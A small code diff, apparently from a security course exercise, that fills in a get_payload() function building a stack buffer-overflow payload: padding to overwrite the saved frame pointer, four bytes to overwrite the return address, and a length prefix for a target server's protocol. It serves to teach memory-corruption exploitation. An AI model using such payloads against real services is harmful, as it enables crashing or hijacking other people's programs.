@@ -14,11 +14,11 @@ def get_payload():
     '''
 
     # TODO: IMPLEMENT THIS FUNCTION
-    message = 'a' * 1036 # we need more than 1036 bytes to overflow
-    message += 'b'
+    message = 'a' * 1040 # we need more than 1036 bytes to fill buffer + 4 to override "old ebp"
+    message += 'abcd' # this will override RET/eip
     message_length = len(message)
     message_length_newtork_order = struct.pack('>L', message_length)
-    return message_length_newtork_order + message
+    return message_length_newtork_order + message # add size of message as "required" by our server protocol 
 
     # NOTE:
     # Don't delete this function - we are going to test it directly in our
